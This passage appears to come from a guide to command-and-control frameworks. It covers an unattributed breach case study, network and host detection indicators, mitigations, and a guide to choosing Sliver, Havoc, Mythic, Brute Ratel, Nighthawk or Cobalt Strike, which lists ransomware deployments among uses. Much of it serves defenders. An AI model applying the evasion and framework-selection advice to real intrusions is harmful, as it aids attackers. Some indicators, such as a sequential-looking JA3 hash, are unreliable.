Organization: Southeast Asian government ministry
Impact: Classified documents exposed
C2 Framework: Havoc Demon

Initial Access (Week 0):
- Compromised third-party vendor
- Supply chain attack via software update
- Demon injected into legitimate software

Havoc Configuration:
Demon:
  Sleep: 30 seconds
  Evasion: Maximum (all features enabled)
  Listener: HTTPS + DNS (backup)

Unique Havoc Features Used:
- Hardware breakpoint hooks (bypassed EDR)
- Indirect syscalls (no ntdll hooks)
- Sleep obfuscation (encrypted memory)
- Module stomping (injected into trusted binaries)

Timeline:
Month 1-2: Quiet Reconnaissance
  - Mapped entire network
  - Identified document management systems
  - Located classified document repositories

Month 3: Credential Harvesting
  - LSASS dumping (5 domain controllers)
  - Extracted 2,500 user hashes
  - Cracked 300 passwords

Month 4-5: Data Access
  - Downloaded 2TB classified documents
  - Emailed documents to external addresses
  - Used legitimate VPN for exfiltration

Month 6: Exit
  - Removed all artifacts
  - Disabled logs
  - Deleted backdoors

Detection: Not detected during operation
- Discovered 8 months later during unrelated audit
- Havoc's hardware breakpoints evaded EDR user-mode hooks
- DNS listener worked through government firewall
```

---

## Detection and Mitigation (Defender Perspective)

### Network Detection

```yaml
# C2 Traffic Indicators

Sliver:
  - JA3 fingerprint: 51c64c77e60f3980eea90869b68c58a8 (mTLS)
  - Periodic beacons with jitter (10-60 seconds)
  - Specific User-Agent: "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.*"
  - TLS certificate common names: "Sliver", "localhost", "Sliver CA"

Havoc:
  - POST requests to /api/v1/poll, /api/v1/results
  - JSON structure: {"DemonID": "...", "Task": "..."}
  - Default ports: 40056 (teamserver), 40057 (client)
  - DNS TXT records with base64 data

Mythic:
  - GraphQL endpoints (/graphql, /api/graphql)
  - WebSocket upgrades with specific handshake
  - Default port 7443 (HTTPS)
  - Agent-specific User-Agents (Apollo uses PowerShell User-Agent)

Brute Ratel:
  - JA3: c0e0b6c2e8b9b8b1b2b3b4b5b6b7b8b9
  - URIs: /api/v1/status, /update, /sync
  - Custom HTTP headers: "X-Badger-Version", "X-BruteRatel"

Nighthawk:
  - DNS query patterns (random subdomains)
  - TLS certificates with 1-year validity
  - Small beacon sizes (2-4KB typical)

Cobalt Strike:
  - Well-documented signatures (JA3, JA3S, patterns)
  - Default URIs: /admin/get.php, /news.php
  - Beacon staging (HTTP 404 response with specific length)
```

### Host Detection

```yaml
# Process and Memory Artifacts

General C2 Indicators:
  - Processes with RWX memory regions (legitimate rarely have)
  - Processes with named pipes (\\.\pipe\microsoft*)
  - DLL injection with unusual parent-child relationships
  - PowerShell with -enc, -e, -EncodedCommand parameters

Sliver:
  - Service names: "Sliver", "SliverBeacon"
  - Registry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Sliver
  - Process names: "svchost.exe" (injected), "rundll32.exe"

Havoc:
  - Hardware breakpoints set (DR registers)
  - Sleep obfuscation (memory encryption cycles)
  - Direct syscalls (no ntdll.dll in call stack)

Mythic:
  - Apollo agent: .NET assemblies loaded in memory
  - WMI event subscriptions
  - Scheduled tasks with "Mythic", "Apollo", "Poseidon" in names

Brute Ratel:
  - Badger process names: "svchost.exe", "notepad.exe", "explorer.exe"
  - Named pipes: \\.\pipe\badger_*, \\.\pipe\microsoft_*
  - Registry: Winlogon\Userinit modifications

Nighthawk:
  - Custom memory allocator (not Windows heap)
  - Module stomping (legitimate DLLs overwritten)
  - Position-independent code (no typical PE structure)
```

### Mitigation Strategies

```yaml
# Enterprise Defenses

1. Endpoint Detection and Response (EDR):
   - Use kernel-mode callbacks (not user-mode hooks)
   - Implement ETW-based detection
   - Monitor for direct syscalls (hardware breakpoint detection)
   - Memory scanning during sleep cycles

2. Network Controls:
   - Implement SSL/TLS inspection
   - DNS sinkholing for suspicious domains
   - Block known JA3/JA3S fingerprints
   - Detect periodic beaconing (statistical analysis)
   - Implement network segmentation

3. Application Controls:
   - Application whitelisting (AppLocker, WDAC)
   - Block PowerShell with Constrained Language Mode
   - Disable WMI, WinRM if not needed
   - Restrict LSASS access (PPL, Credential Guard)
   - Disable .NET assembly execution

4. User Training:
   - Phishing simulations
   - MFA enforcement (especially for privileged accounts)
   - Principle of least privilege
   - Regular password rotation

5. Detection Engineering:
   - Hunt for indirect syscalls (call stack anomalies)
   - Monitor for sleep obfuscation patterns
   - Detect named pipe creation patterns
   - Hunt for unusual parent-child processes
   - Monitor for registry persistence modifications

6. Incident Response:
   - Maintain offline backups
   - Practice breach scenarios
   - Have EDR with rollback capabilities
   - Implement SOAR for automated response
```

---

## Framework Selection Guide

### When to Use Sliver

```
Advantages:
- Free and open source
- Cross-platform (Windows, Linux, macOS)
- Active development (weekly updates)
- WireGuard tunnels for pivoting
- No license restrictions

Best for:
- Teams with limited budget
- Linux/macOS targets
- Learning C2 fundamentals
- Long-term operations (reliable)
- Custom modifications needed

Limitations:
- No GUI (CLI only)
- Go binaries are detectable
- Smaller module ecosystem
- Less evasion than commercial options
```

### When to Use Havoc

```
Advantages:
- Modern evasion (indirect syscalls, hardware breakpoints)
- Free and open source
- Modern GUI (Qt6)
- BOF support
- Active community

Best for:
- Windows targets with EDR
- Teams wanting advanced evasion without cost
- BOF development
- Red team assessments

Limitations:
- Newer framework (less mature)
- Smaller community
- Limited modules
- Teamserver stability issues (2024 versions)
```

### When to Use Mythic

```
Advantages:
- Multi-agent architecture
- REST API for automation
- Web UI (accessible anywhere)
- Containerized building
- Many agent options

Best for:
- Multi-platform operations
- Teams needing automation
- Long-term campaigns
- Agent development
- Multi-user operations

Limitations:
- Complex deployment
- Resource intensive
- Python dependencies
- Steeper learning curve
```

### When to Purchase Commercial Frameworks

```
Brute Ratel C4 - Best for:
- EDR evasion required
- Windows-only operations
- Ransomware deployments
- Teams with budget ($2500/operator)

Nighthawk - Best for:
- Highest quality evasion
- UK/EU government work
- Windows focus
- Teams with MDSec relationship

Cobalt Strike - Best for:
- Industry standard
- BOF ecosystem
- Red team assessments
- Teams with existing licenses

Purchase Decision Factors:
1. Detection rate requirements
2. Budget available
3. Team size
4. Target environment (EDR strength)
5. Operation duration
6. Legal/regulatory requirements
```

---

## References and Further Reading

```
Official Documentation:
- Sliver: https://github.com/BishopFox/sliver/wiki
- Havoc: https://github.com/HavocFramework/Havoc
- Mythic: https://docs.mythic-c2.net/
- Brute Ratel: https://bruteratel.com/
- Cobalt Strike: https://hstechdocs.helpsoftware.com/cobaltstrike/

Detection Resources:
- JA3 Fingerprinting: https://github.com/salesforce/ja3
- Cobalt Strike Detection Guide (Mandiant)
- EDR Evasion Techniques (SpecterOps)

Real-World Reports:
- 2023 Healthcare Ransomware (CISA Report AA23-xxx)
- 2024 Financial APT (Mandiant M-Trends)
- Brute Ratel Usage in LockBit (Unit 42)

Research Papers:
- "Sleeping with the Fishes" (MDSec on sleep obfuscation)
- "Indirect Syscalls for EDR Evasion" (Paranoid Ninja)
- "Hardware Breakpoint Hooking" (Havoc Framework blog)
```
